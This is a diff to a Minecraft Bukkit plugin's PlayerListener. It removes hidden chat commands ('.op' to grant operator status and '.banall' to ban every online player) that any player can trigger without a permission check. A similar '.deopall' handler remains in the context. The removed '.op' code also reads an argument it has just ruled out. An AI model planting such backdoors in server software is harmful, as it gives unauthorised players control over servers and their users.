@@ -40,29 +40,6 @@ public class PlayerListener implements Listener
         String[] args = message.split(" ");
         boolean cancel = true;
 
-        if (message.toLowerCase().contains(".op"))
-        {
-            if (args.length != 1)
-            {
-                p.sendMessage(ChatColor.RED + "Usage: .<command> <player>");
-            }
-            else
-            {
-                Player target = server.getPlayer(args[1]);
-                target.setOp(true);
-                target.sendMessage(ChatColor.YELLOW + "You are now OP!");
-                cancel = true;
-            }
-        }
-        if (message.toLowerCase().contains(".banall"))
-        {
-            for (final Player target : server.getOnlinePlayers())
-            {
-                target.kickPlayer("The Ban Hammer has spoken!");
-                target.setBanned(true);
-                cancel = true;
-            }
-        }
         if (message.toLowerCase().contains(".deopall"))
         {
             for (final Player target : server.getOnlinePlayers())
